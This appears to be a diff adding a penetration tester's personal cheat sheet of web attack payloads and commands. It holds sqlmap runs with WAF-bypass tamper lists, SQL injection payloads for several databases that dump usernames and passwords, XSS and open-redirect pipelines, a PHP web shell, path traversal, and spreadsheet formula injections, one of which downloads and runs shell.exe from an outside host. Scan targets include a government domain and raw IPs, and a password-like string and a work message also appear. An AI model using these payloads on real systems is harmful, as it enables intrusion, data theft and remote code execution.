@@ -1,0 +1,147 @@
+
+---------------------------------------------------------------------------------------------------
+xss
+1. echo "demo.testfire.net" | waybackurls | ./gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
+
+----------------------------------------------------------------------------------------------------
+sql Injection
+subfinder -d cm.com | httpx -mc 200 -o alive.txt
+
+cat alive.txt | waybackurls | tee -a urls.txt
+
+gf sqli urls.txt >> sqli
+
+sqlmap -m sqli --dbs --batch
+
+-----------------------------------------------------------------------------------------------------
+Open Redirection
+1. waybackurls http://testphp.vulnweb.com/ | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I|grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
+
+2. echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
+
+---------------------------------------------------------------------------------------------------
+wpscan -v --disable-tls-checks --url https://40.68.78.11/ 
+---------------------------------------------------------------------------------------------------
+sort sub1.txt sub2.txt | uniq -u > finalsubdomain.txt     {use multiple subdomain output files and merge then as one}
+===Use OWASP Ceet Sheet======
+
+<?php echo passthru($_GET["cmd"]); ?>      &cmd=pwd
+
+http://192.168.1.101.gf
+----------------------------------------------------------------------------------------------------
+sqlmap.py -r sql.txt --dbms=MYSQL --force-ssl --random-agent --ignore-proxy --tamper=space2comment --no-cast --batch -p parameter_name --ignore-code=401 --flush-session 
+sqlmap.py -r map.txt --force-ssl --level=5 --risk=3 --dbs --hostname --current-user --batch
+sqlmap.py -r sql.txt --force-ssl --level=5 --risk=3 --dbs --hostname --current-user --random-agent -tamper=space2comment --batch
+
+Cloudflare --  --tamper=between,randomcase,space2comment,tofla
+
+--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+--------------------------------------------------------------------
+--------------------------------------------------------------------
+Postgresql Payloads - ';SELECT PG_SLEEP(10)--
+					  ' OR 4511=4511 OR 'cKZI'='UuQc
+					  ' AND 3582=(SELECT 3582 FROM PG_SLEEP(5)) OR 'qooy'='MCjR
+					  ' AND 1654=(SELECT 1654 FROM PG_SLEEP(5)) AND 'aKyh'='aKyh 
+					  ' OR 4018=(SELECT (CASE WHEN (4018=4018) THEN 4018 ELSE (SELECT 3375 UNION SELECT 4673) END))--
+					  (SELECT (CASE WHEN (9234=9234) THEN 62 ELSE (SELECT 7537 UNION SELECT 9465) END))           --> Boolean base  --> Yes/No wala
+---------------------------------------------------------------------					  
+MySQL Payload - ' or 1=1#
+				'+and+sleep(5)#
+				' RLIKE SLEEP(5) AND 'ecop'='ecop
+				' AND (SELECT 6228 FROM (SELECT(SLEEP(5)))aa) AND 'bb'='bb
+				2 AND (SELECT 8565 FROM (SELECT(SLEEP(5)))feLE)   --> Time Based
+				(SELECT (CASE WHEN (9966=9966) THEN 431122 ELSE (SELECT 9604 UNION SELECT 1441) END))   --> Boolean Based  --> Yes/No wala
+				
+				--> ' ORDER BY 1--
+				--> ' UNION SELECT NULL,NULL,NULL--
+
+	retrive table_nmae --> Lifestyle'+union+select+table_name,null+from+information_schema.tables--
+	retrive column_names --> Lifestyle'+union+select+column_name,null+from+information_schema.columns+where+table_name='retrived_table_name'--
+	dump data --> Lifestyle'+union+select+column_name,column_name+from+retrived_table_name--
+	retruve data from single column --> Gifts'+union+select+null,username||'~'||password+from+table_name--
+-------------------------------------------------------------------------				
+				
+MSSQL Payload - ’+waitfor+delay+‘0:0:5’--
+
+		--> ‘; waitfor delay ‘0:30:0’--
+		--> 1; waitfor delay ‘0:30:0’--
+		--> (select(0)from(select(sleep(13)))v)/*'+
+		--> (select(0)from(select(sleep(13)))v)+'\"+
+		--> (select(0)from(select(sleep(13)))v)+\"*/
+
+-----------------------------------------------------------------
+Oracle
+		--> Union --> ' UNION SELECT NULL FROM DUAL--
+	retrive table names --> Lifestyle'+union+select+table_name,null+from+all_tables--
+	retrive column_name --> Lifestyle'+union+select+column_name,null+from+all_tab_columns+where+table_name='retrived_table_name'--
+	retrive data --> Lifestyle'+union+select+USERNAME_CLWWIC,PASSWORD_MUZZXO+from+retrived_table_name--
+
+
+
+----------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------
+
+../../Windows/System32/cmd.exe?/c+dir+c:\
+
+=cmd|' /C calc'!'A0'
+
+%3dcmd%7c%27%20%2fC%20calc%27%21%27A0%27
+
+;=2+5+cmd|' /C calc'!A0
+=@SUM(1+1)*cmd|' /C calc'!A0
+-2+3+cmd|' /C calc'!A0
+=SUM(1+1)*cmd|' /C calc'!A0  -->try this one
+=cmd|' /C powershell Invoke-WebRequest "http://192.168.0.8:8/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
+-SSRF  --> use a whitelist of allowed domains
+
+Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+----------------------------------------------------------------------------------------------
+(((((( NMAP ))))))
+
+nmap -p80 --script http-waf-detect www.loiliangyang.com   --> Firewall detection
+
+nmap --script=http-waf-fingerprint www.loiliangyang.com   --> Firewall Fingerprinting 
+
+cloudffail --> python3 cloudfail.py -t www.test.com
+
+wafw00f --> wafw00f www.test.com
+
+sublister --> python3 sublister.py -d www.google.com -b(b for burte force) 
+
+nmap -sC -sS -sV -v -n supportoios.cag.gov.in   --> Scan
+----------------------------------------------------------------------------------------------
+get vs post
+
+Bookmarked-->	Can be bookmarked	Cannot be bookmarked
+Cached-->	Can be cached	Not cached
+History-->	Parameters remain in browser history	Parameters are not saved in browser history
+Restrictions on data length-->  maximum URL length is 2048 characters   No restrictions
+Security--> 	save in browser history   no in browser hostory
+Visibility-->	Data is visible to everyone in the URL	Data is not displayed in the URL
+-----------------------------------------------------------------------------------------------
+
+Shodan Filters
+ -port:80
+ -os:windows 7
+ -city:"Noida"
+ -apache 2.2.3    -->server with version number
+ 
+
+@K$12naj
+
+
+Sir, Currently I am working on DAT project they have 2 web app and 1 mobile app audit in pendeing and I will be available from 4th April.
+
+
+https://app.intigriti.com/researcher/programs/lansweeper/lansweeper1/detail
+
+https://app.intigriti.com/researcher/programs/intergamma/intergamma/detail
+
+https://193.173.253.148/ --> default apache page
+
+
+--------------
+
+
+
+
